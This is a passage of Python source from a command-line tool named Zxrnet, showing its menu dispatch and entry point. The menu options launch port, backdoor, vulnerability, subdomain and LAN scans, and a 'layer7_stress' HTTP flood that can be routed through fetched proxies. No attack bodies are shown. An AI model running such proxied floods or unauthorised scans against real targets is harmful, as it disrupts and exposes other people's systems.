                elif choice == "2":
                    self.fetch_proxies()

                elif choice == "3":
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.test_all_proxies(threads)

                elif choice == "4":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    port_range_input = self.get_user_input("Port range (start-end)", "1-1000")
                    port_range = self.validate_port_range(port_range_input)
                    if not port_range:
                        continue
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_ports(target, port_range, threads)

                elif choice == "5":
                    target = self.get_user_input("Target IP", None)
                    if not self.validate_ip(target):
                        print(colored("[-] Invalid IP!", "red", attrs=["bold"]))
                        continue
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_backdoors(target, threads)

                elif choice == "6":
                    scan_type = self.get_user_input("Scan single file (1) or system (2)", None)
                    if scan_type == "1":
                        file_path = self.get_user_input("File path", None)
                        self.scan_virus(file_path)
                    elif scan_type == "2":
                        self.scan_virus()
                    else:
                        print(colored("[-] Invalid choice!", "red", attrs=["bold"]))

                elif choice == "7":
                    target = self.get_user_input("Target URL", None)
                    duration = int(self.get_user_input("Duration (seconds)", "60"))
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    use_proxies = self.get_user_input("Use proxies? (y/n)", "y").lower() in ["", "y"]
                    self.layer7_stress(target, duration, threads, use_proxies)

                elif choice == "8":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    limit = int(self.get_user_input("Max subdomains to check", "10000"))
                    self.enumerate_subdomains(domain, threads, limit)

                elif choice == "9":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_vulnerabilities(url, threads)

                elif choice == "10":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    self.fingerprint_web(url)

                elif choice == "11":
                    domain = self.get_user_input("Target domain (e.g., example.com)", None)
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_related_domains(domain, threads)

                elif choice == "12":
                    url = self.get_user_input("Target URL (e.g., http://example.com)", None)
                    self.simple_pentest(url)

                elif choice == "13":
                    threads = int(self.get_user_input("Number of threads", str(self.max_threads)))
                    self.scan_lan(threads)

                elif choice == "14":
                    print(colored("[+] Exiting Zxrnet...", "green", attrs=["bold"]))
                    self.save_config()
                    self.open_exit_link()
                    sys.exit(0)

                else:
                    print(colored("[-] Invalid option!", "red", attrs=["bold"]))

            except ValueError as e:
                print(colored(f"[-] Input error: {e}", "red", attrs=["bold"]))
            except Exception as e:
                print(colored(f"[-] Unexpected error: {e}", "red", attrs=["bold"]))
                log_message(f"Unexpected error: {e}")

            input(colored("[>] Press Enter to continue...", "yellow", attrs=["bold"]))
            self.clear_screen()

if __name__ == "__main__":
    print(colored("[*] Starting Zxrnet...", "green", attrs=["bold"]))
    tool = Zxrnet()
    tool.run()